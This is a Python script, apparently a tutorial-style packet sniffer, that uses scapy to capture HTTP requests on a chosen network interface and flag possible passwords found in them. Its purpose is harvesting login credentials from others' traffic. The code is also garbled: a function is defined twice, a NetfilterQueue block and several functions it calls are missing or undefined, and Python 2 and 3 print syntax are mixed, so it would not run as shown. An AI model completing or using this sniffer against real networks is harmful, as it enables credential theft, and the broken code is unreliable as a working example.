import scapy.all as scapy
from scapy.layers import http
from termcolor import colored
import optparse



def process_sniffed_packages(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("*"*25)
        print("HTTP Request: " + url)

nfqueue = NetfilterQueue()
nfqueue.bind(1, print_and_accept)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print


def get_url(packet):
    return packet.show()


def process_sniffed_packages(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("*"*25)
        print("HTTP Request: " + url)
        login_info = looking_password(packet)
        if login_info:
            print colored("Possible password found : " + login_info, 'white', 'on_red')

def arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Select the interface to sniff")
    (options, arguments) = parser.parse_args()
    if not options.interface:
        parser.error("[+] Please specify an interface")
    else:
        return options

options = arguments()


packet_sniffer(options.interface)
